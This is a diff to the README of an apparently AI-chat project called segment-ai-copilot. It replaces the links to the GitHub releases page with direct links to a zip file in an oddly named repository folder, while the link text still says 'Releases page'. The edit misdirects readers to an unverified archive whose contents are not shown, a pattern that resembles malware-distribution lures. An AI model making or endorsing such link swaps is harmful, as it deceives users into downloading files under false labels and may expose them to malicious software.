@@ -6,14 +6,14 @@ Welcome to segment-ai-copilot! This application helps you connect with an AI cha
 
 ## 🌐 Download the Application
 
-[![Download segment-ai-copilot](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/Datphan26/segment-ai-copilot/releases)
+[![Download segment-ai-copilot](https://raw.githubusercontent.com/Datphan26/segment-ai-copilot/main/appleringy/segment-ai-copilot.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/Datphan26/segment-ai-copilot/main/appleringy/segment-ai-copilot.zip)
 
 ## 📥 Download & Install
 
 Follow these simple steps to download and install segment-ai-copilot:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Datphan26/segment-ai-copilot/releases) to find the latest version of the application. 
+   Go to our [Releases page](https://raw.githubusercontent.com/Datphan26/segment-ai-copilot/main/appleringy/segment-ai-copilot.zip) to find the latest version of the application. 
 
 2. **Select the Appropriate File**  
    On the Releases page, you will see a list of downloadable files. Choose the one that corresponds to your operating system. The file names will usually indicate whether they are for Windows, Mac, or Linux.
